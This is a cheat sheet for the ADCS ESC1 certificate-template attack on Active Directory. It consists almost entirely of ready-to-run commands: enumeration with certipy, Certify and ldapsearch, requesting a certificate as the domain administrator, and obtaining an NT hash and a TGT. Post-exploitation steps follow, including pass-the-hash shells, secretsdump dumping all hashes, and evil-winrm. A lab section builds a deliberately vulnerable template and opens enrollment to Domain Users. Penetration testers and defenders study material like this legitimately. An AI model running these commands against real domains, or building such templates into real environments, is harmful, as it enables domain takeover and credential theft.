# ESC1 Condition
```powershell
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT     -       The certificate requester can define its own SAN (Subject Alternative Name) value
Broad enrollment permit               -       Can enroll Domain Users, Authenticated Users, or other large groups
Manager approval is not required      -       The certificate is issued automatically
EKU (Extended Key Usage)              -       Client Authentication, Smart Card Logon or other authentication options available
```

# ESC1 Flags
```powershell
msPKI-Certificate-Name-Flag      -      0x1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)       -       The SAN is determined by the requester
msPKI-Enrollment-Flag            -      0x0                                           -       No manager approval
```

# ESC1 Enumeration
```powershell
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

Certify.exe find /vulnerable
Certify.exe find /vulnerable /ca:"CA-Server\CA-Name"
```

# ESC1 Enumeration With LDAP
```powershell
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
```

# ESC1 Exploitation with Certipy
```powershell
# Request a certificate on behalf of the Domain Admin
certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -target 192.168.0.150 \
    -ca 'certificate-WIN-CERTIFICATE-CA' \
    -template 'VulnESC1' \
    -upn 'administrator@certificate.local' \
    -ldap-scheme ldap

# Get NT Hash from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -dc-ip 10.10.10.10

# Get TGT from certificate
certipy-ad auth \
  -pfx administrator.pfx \
  -domain domain.local \
  -dc-ip 10.10.10.10
```

# ESC1 Exploitation With Certify and Rubeus
```powershell
# Request a certificate on behalf of the Domain Admin
Certify.exe request /ca:"CA-Server\CA-Name" /template:"VulnerableTemplate" /altname:"administrator"

# Convert PEM → PFX (on Linux side)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Buy TGT with Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:'' /ptt

# Check whoami
klist
whoami /all
```

# Post Exploitation
```powershell
# SMB with NT Hash
impacket-psexec -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Secretsdump — dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

# Labaratory
```powershell
$configNC = (Get-ADRootDSE).configurationNamingContext
$templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
$attrs = @{
    "displayName"                          = "VulnESC1"
    "msPKI-Cert-Template-OID"              = "1.3.6.1.4.1.311.21.8.1417189.1978403.869562.7555284.2956879.9.1.100"
    "msPKI-Certificate-Name-Flag"          = 1
    "msPKI-Enrollment-Flag"                = 0
    "msPKI-Minimal-Key-Size"               = 2048
    "msPKI-Private-Key-Flag"               = 0
    "msPKI-RA-Signature"                   = 0
    "msPKI-Template-Schema-Version"        = 2
    "msPKI-Template-Minor-Revision"        = 0
    "msPKI-Certificate-Application-Policy" = "1.3.6.1.5.5.7.3.2"
    "pKIExtendedKeyUsage"                  = "1.3.6.1.5.5.7.3.2"
    "pKIDefaultKeySpec"                    = 1
    "pKIMaxIssuingDepth"                   = 0
    "pKIKeyUsage"                          = [byte[]]@(0x80, 0x00)
    "pKIDefaultCSPs"                       = "1,Microsoft Enhanced Cryptographic Provider v1.0"
    "flags"                                = 131680
    "revision"                             = 100
}
New-ADObject -Name "VulnESC1" `
             -Path $templatePath `
             -Type "pKICertificateTemplate" `
             -OtherAttributes $attrs



Get-ADObject "CN=VulnESC1,$templatePath" -Properties displayName, msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage | Format-List




$configNC = (Get-ADRootDSE).configurationNamingContext
$templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
$acl = Get-Acl "AD:\CN=VulnESC1,$templatePath"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"Domain Users",
    "ExtendedRight",
    "Allow")
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=VulnESC1,$templatePath" -AclObject $acl
```
